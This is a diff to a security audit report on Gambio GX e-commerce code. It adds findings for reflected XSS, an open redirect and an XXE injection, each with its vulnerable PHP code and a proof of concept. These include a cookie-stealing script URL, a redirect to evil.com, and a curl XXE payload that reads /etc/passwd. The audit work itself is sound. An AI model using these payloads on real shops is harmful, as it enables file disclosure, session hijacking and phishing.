@@ -10,7 +10,7 @@
 
 This security audit examined the provided Gambio GX source code archive to identify HTTP-reachable security vulnerabilities with provable exploitation paths.
 
-**Result: 1 Critical Vulnerability + 2 Medium Vulnerabilities Identified**
+**Result: 1 Critical + 1 High + 4 Medium Vulnerabilities Identified**
 
 ---
 
@@ -28,7 +28,9 @@ This security audit examined the provided Gambio GX source code archive to ident
 | `ext/heidelpay/heidelpayGW_gateway.php` | GET | Session | None |
 | `callback/sofort/ressources/scripts/getContent.php` | POST | None | url |
 | `callback/sofort/ressources/scripts/sofortReturn.php` | GET/POST | Session | sofortaction, sofortcode |
+| `callback/sofort/ressources/scripts/sofortOrders.php` | GET/POST | Admin | oID, action, errorText, successText |
 | `ext/it_recht/itrk_content.php` | GET | None | itrk_file_type (via include) |
+| `ext/mailhive/cloudbeez/cloudloader/bootstrap/inc_mailbeez.php` | GET | None | REQUEST_URI |
 
 ---
 
@@ -179,6 +181,117 @@ Same pattern as above. The session language value is used without validation.
 
 **Severity:** Medium (requires prior session control)
 
+### 4. Reflected XSS in sofortOrders.php
+
+**File:** `callback/sofort/ressources/scripts/sofortOrders.php`  
+**Lines:** 631-632
+
+**[ENTRYPOINT]**
+```php
+echo urldecode($_GET['errorText']);
+echo urldecode($_GET['successText']);
+```
+
+**[SOURCE]**  
+GET parameters `errorText` and `successText`
+
+**[SINK]**  
+Direct output to browser via `echo`
+
+**[USER CONTROL PRESERVED: YES]**
+
+**Analysis:**  
+The `errorText` and `successText` GET parameters are URL-decoded and directly echoed without any HTML encoding or sanitization. An attacker can inject arbitrary JavaScript code.
+
+**Proof of Concept:**
+```
+GET /callback/sofort/ressources/scripts/sofortOrders.php?action=edit&oID=1&errorText=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+```
+
+The URL-decoded payload `<script>alert(document.cookie)</script>` will be directly output to the page.
+
+**Impact:** Medium - Session hijacking, admin account compromise  
+**Severity:** Medium (requires authenticated admin user to click malicious link)
+
+### 5. Open Redirect in inc_mailbeez.php
+
+**File:** `ext/mailhive/cloudbeez/cloudloader/bootstrap/inc_mailbeez.php`  
+**Lines:** 17-20
+
+**[ENTRYPOINT]**
+```php
+if (stristr($_SERVER['REQUEST_URI'], '?cmd=mailbeez')) {
+    $redirect_url = str_replace('index.php?cmd=mailbeez&', 'mailbeez.php?', $_SERVER['REQUEST_URI']);
+    header("Location: $redirect_url");
+    die();
+}
+```
+
+**[SOURCE]**  
+`$_SERVER['REQUEST_URI']` - user-controlled via request
+
+**[SINK]**  
+`header("Location: $redirect_url")` - HTTP redirect
+
+**[USER CONTROL PRESERVED: YES]**
+
+**Analysis:**  
+The `REQUEST_URI` is used with a simple string replacement and then used in a redirect. An attacker can craft a URL that bypasses the check and redirects to an arbitrary domain.
+
+**Proof of Concept:**
+```
+GET /index.php?cmd=mailbeez&//evil.com/path
+```
+
+**Impact:** Medium - Phishing attacks via trusted domain  
+**Severity:** Medium
+
+### 6. XML External Entity (XXE) Injection in heidelpayGW_push.php
+
+**File:** `ext/heidelpay/heidelpayGW_push.php`  
+**Lines:** 20-24
+
+**[ENTRYPOINT]**
+```php
+$rawPost = file_get_contents('php://input');
+$rawPost = preg_replace('/<Criterion(\s+)name="(\w+)">(.+)<\/Criterion>/', '<$2>$3</$2>',$rawPost);
+$xml = simplexml_load_string($rawPost);
+```
+
+**[SOURCE]**  
+`file_get_contents('php://input')` - raw POST body (XML)
+
+**[SINK]**  
+`simplexml_load_string($rawPost)` - XML parser
+
+**[USER CONTROL PRESERVED: YES]**
+
+**Analysis:**  
+Raw XML input is parsed via `simplexml_load_string()` without disabling external entity loading. By default in older PHP versions (< 8.0), external entities are enabled.
+
+**Proof of Concept:**
+```bash
+curl -X POST https://target.com/ext/heidelpay/heidelpayGW_push.php \
+  -H "Content-Type: application/xml" \
+  -d '<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<Transaction>
+  <Identification>
+    <TransactionID>&xxe;</TransactionID>
+  </Identification>
+  <Analysis>
+    <SECRET>test</SECRET>
+  </Analysis>
+</Transaction>'
+```
+
+**Note:** The hash verification (line 31) may prevent exploitation unless the attacker can predict/compute valid hashes. However, the XML parsing occurs BEFORE the hash check, so XXE payloads are processed regardless.
+
+**Impact:** High - File disclosure, potential SSRF  
+**Severity:** High (depends on PHP version; PHP 8.0+ has XXE disabled by default)
+
 ---
 
 ## ADDITIONAL OBSERVATIONS (Non-Exploitable Without Additional Conditions)
@@ -257,13 +370,19 @@ if (isset($metaData['payment_class'])) {
 
 ## CONCLUSION
 
-The security audit identified **1 Critical vulnerability** and **2 Medium vulnerabilities** in the Gambio GX source code:
+The security audit identified **1 Critical**, **1 High**, and **4 Medium** vulnerabilities in the Gambio GX source code:
 
-1. **Critical: Local File Inclusion in swixpostfinancecheckout callback** - Can lead to Remote Code Execution if an attacker can control transaction metadata or inject files to known paths.
+### Critical
+1. **Local File Inclusion in swixpostfinancecheckout callback** - Can lead to Remote Code Execution if an attacker can control transaction metadata or inject files to known paths.
 
-2. **Medium: Session-Based LFI in cloudloader_core.php** - Requires session control to exploit
+### High
+2. **XXE Injection in heidelpayGW_push.php** - XML parsing before authentication allows file disclosure and SSRF on PHP < 8.0
 
-3. **Medium: Session-Based LFI in cloudloader_packages.php** - Requires session control to exploit
+### Medium
+3. **Session-Based LFI in cloudloader_core.php** - Requires session control to exploit
+4. **Session-Based LFI in cloudloader_packages.php** - Requires session control to exploit
+5. **Reflected XSS in sofortOrders.php** - Admin-facing XSS via errorText/successText parameters
+6. **Open Redirect in inc_mailbeez.php** - Redirect via REQUEST_URI manipulation
 
 The remaining code analyzed contains appropriate security controls (input validation, SQL escaping, domain whitelisting) that prevent exploitation of common vulnerability classes.
 
